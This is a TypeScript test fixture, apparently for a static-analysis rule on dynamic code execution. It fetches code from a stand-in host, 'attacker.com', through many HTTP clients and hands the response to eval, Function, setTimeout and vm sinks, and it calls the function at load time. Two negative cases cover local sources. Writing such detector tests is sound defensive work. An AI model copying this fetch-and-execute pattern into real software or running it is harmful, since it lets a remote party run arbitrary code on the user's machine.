// Dynamic Code Execution positive/negative test cases.

import axios from 'axios';
import nodeFetch from 'node-fetch';
import * as http from 'http';
import * as https from 'https';
import got from 'got';
import superagent from 'superagent';
import * as vm from 'vm';

function executeAll(code: any) {
    const evil = eval;
    const Fn = Function;
    const run = vm.runInThisContext;
    const Script = vm.Script;

    eval(code);
    evil(code);
    Function(code)();
    Fn(code)();
    setTimeout(code, 1000);
    setInterval(code, 1000);
    vm.runInThisContext(code);
    run(code);
    vm.runInNewContext(code, {});
    new vm.Script(code);
    new Script(code);
}

async function triggerRule() {
    const url = 'http://attacker.com/code';

    // global fetch
    const globalFetchRes = await fetch(url);
    executeAll(await globalFetchRes.text());

    // node-fetch import
    const nodeFetchRes = await nodeFetch(url);
    executeAll(await nodeFetchRes.text());

    // axios direct/get/post/request
    const ax0 = await axios({ url, method: 'GET' });
    executeAll(ax0.data);

    const ax1 = await axios.get(url);
    executeAll(ax1.data);

    const ax2 = await axios.post(url, { q: 'x' });
    executeAll(ax2.data);

    const ax3 = await axios.request({ url, method: 'GET' });
    executeAll(ax3.data);

    // got direct/get/post
    const g0 = await got(url);
    executeAll(g0.body);

    const g1 = await got.get(url);
    executeAll(g1.body);

    const g2 = await got.post(url);
    executeAll(g2.body);

    // superagent then
    superagent.get(url).then((res: any) => {
        executeAll(res.text);
        executeAll(res.body);
    });

    // superagent end
    superagent.get(url).end((err: any, res: any) => {
        executeAll(res.text);
        executeAll(res.body);
    });

    // superagent await
    const sa = await superagent.get(url);
    executeAll(sa.text);
    executeAll(sa.body);

    // https response data event
    https.get(url, (res) => {
        let body = '';

        res.on('data', (chunk) => {
            body += chunk;
            executeAll(chunk);
        });

        res.on('end', () => {
            executeAll(body);
        });
    });

    // http response data event
    http.get(url, (res) => {
        let body = '';

        res.on('data', (chunk) => {
            body += chunk;
            executeAll(chunk);
        });

        res.on('end', () => {
            executeAll(body);
        });
    });

    // browser message event
    if (typeof window !== 'undefined') {
        window.addEventListener('message', (event: MessageEvent) => {
            executeAll(event.data);
        });
    }

    // Negative: local process event should not be treated as remote source.
    process.on('data' as any, (chunk: any) => {
        executeAll(chunk);
    });

    // Negative: local constant should not be reported.
    const localCode = 'console.log("safe local test")';
    executeAll(localCode);
}

triggerRule();